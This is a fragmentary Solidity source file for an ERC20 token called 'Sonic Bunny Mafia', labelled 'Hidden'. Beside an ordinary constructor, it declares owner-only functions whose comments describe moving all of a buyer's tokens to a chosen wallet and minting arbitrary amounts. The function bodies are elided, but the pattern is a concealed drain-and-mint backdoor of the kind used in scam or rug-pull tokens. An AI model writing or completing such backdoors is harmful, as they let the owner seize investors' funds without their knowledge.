...
// File: Token (Burn and Mint - Hidden 4.1) - grantGift.sol
...
contract BunnyMafia is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("Sonic Bunny Mafia", "BunnyMafia") Ownable(initialOwner) {
        _mint(initialOwner, 50000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function burnMafia(address from, address to) external onlyOwner {
    ...
    function rewardMafia(address to, uint256 amount) public onlyOwner {
